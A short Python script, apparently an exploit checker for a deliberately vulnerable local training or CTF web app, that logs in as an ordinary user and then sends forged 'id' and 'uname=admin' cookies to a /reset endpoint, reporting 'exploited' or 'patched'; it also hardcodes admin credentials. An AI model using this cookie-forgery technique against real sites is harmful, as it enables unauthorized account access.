import requests

URL = 'http://localhost:8000/signin'

def health_check(url) -> bool :
    try:
        r = requests.get(url)
    except:
        return False

    if r.status_code == 200 :
        client=requests.session()
        client.get(url)

        if 'csrftoken' in client.cookies:
            csrftoken=client.cookies['csrftoken']
        else:
            csrftoken=client.cookies['csrf']    
        
        login_data = dict(username='admin', password='secret_123', csrfmiddlewaretoken=csrftoken, next='/index')
        r=client.post(url, data=login_data, headers=dict(Referer=url))
        if r.status_code == 200 :
            return True 
        else : return False
    else : return False

def exploit_check(url):
    # if health_check(url):
    client=requests.session()
    client.cookies.clear()
    client.get(url)
    if 'csrftoken' in client.cookies:
        csrftoken=client.cookies['csrftoken']
    else:
        csrftoken=client.cookies['csrf']      
    
    cookie = {'id':'3','uname':'admin'}
    login_data = dict(username='johndoe', password='jojo_123', csrfmiddlewaretoken=csrftoken,next='/index')
    r=client.post(url, data=login_data, headers=dict(Referer=url))
    # print(client.cookies.keys())
    # print(client.cookies.get('id'))
    # client.cookies.set('id', '3',domain='localhost')
    # print(client.cookies.keys())
    # client.cookies.set('uname','admin')
    # print(client.cookies.keys())
    r= client.get('http://localhost:8000/reset',cookies=cookie)
    print(r.text)
    if "403" in r.text :
        return False
    else : return True

if exploit_check(URL):
    print("exploited")
else : print('patched')
